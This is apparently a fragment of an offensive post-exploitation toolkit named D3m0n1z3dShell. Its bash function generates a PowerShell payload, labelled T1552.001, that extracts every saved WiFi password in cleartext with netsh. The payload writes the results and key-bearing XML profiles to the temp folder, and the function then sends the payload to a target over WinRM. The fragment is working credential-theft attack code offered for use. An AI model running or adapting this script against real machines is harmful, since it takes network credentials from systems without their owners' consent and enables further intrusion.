# ──────────────────────────────────────────────
gen_wifi() {
    echo -e "${CYAN}[*] T1552.001 — WiFi Password Extraction (Admin Required)${NC}"

    local OUTFILE="${PAYLOAD_DIR}/win_wifi_dump.ps1"
    cat > "$OUTFILE" << 'PSEOF'
# T1552.001 — WiFi Password Extraction
# Generated by D3m0n1z3dShell
# Requires: Administrator (for key=clear)

Write-Host "[*] Extracting saved WiFi passwords..." -ForegroundColor Yellow
Write-Host ""

$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[-1].Trim()
}

if ($profiles.Count -eq 0) {
    Write-Host "[-] No WiFi profiles found" -ForegroundColor Red
    exit 1
}

$results = @()
foreach ($profile in $profiles) {
    $detail = netsh wlan show profile name="$profile" key=clear 2>$null
    $password = ($detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() })
    $auth = ($detail | Select-String "Authentication" | Select-Object -First 1 | ForEach-Object { ($_ -split ":")[-1].Trim() })
    $cipher = ($detail | Select-String "Cipher" | Select-Object -First 1 | ForEach-Object { ($_ -split ":")[-1].Trim() })

    $obj = [PSCustomObject]@{
        SSID = $profile
        Auth = $auth
        Cipher = $cipher
        Password = if ($password) { $password } else { "(open/enterprise)" }
    }
    $results += $obj

    if ($password) {
        Write-Host "  [+] $profile : $password  ($auth/$cipher)" -ForegroundColor Green
    } else {
        Write-Host "  [-] $profile : (no cleartext key)  ($auth)" -ForegroundColor Yellow
    }
}

# Export to file
$outFile = "$env:TEMP\wifi_passwords.txt"
$results | Format-Table -AutoSize | Out-String | Set-Content $outFile
Write-Host "`n[+] Results saved to: $outFile" -ForegroundColor Green
Write-Host "[+] Found $($results.Count) profiles, $(@($results | Where-Object { $_.Password -ne '(open/enterprise)' }).Count) with passwords" -ForegroundColor Green

# Also export XML profiles (contain PSK in some cases)
$xmlDir = "$env:TEMP\wifi_xml"
New-Item -ItemType Directory -Path $xmlDir -Force | Out-Null
netsh wlan export profile folder="$xmlDir" key=clear 2>$null | Out-Null
Write-Host "[+] XML profiles exported to: $xmlDir" -ForegroundColor Green
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

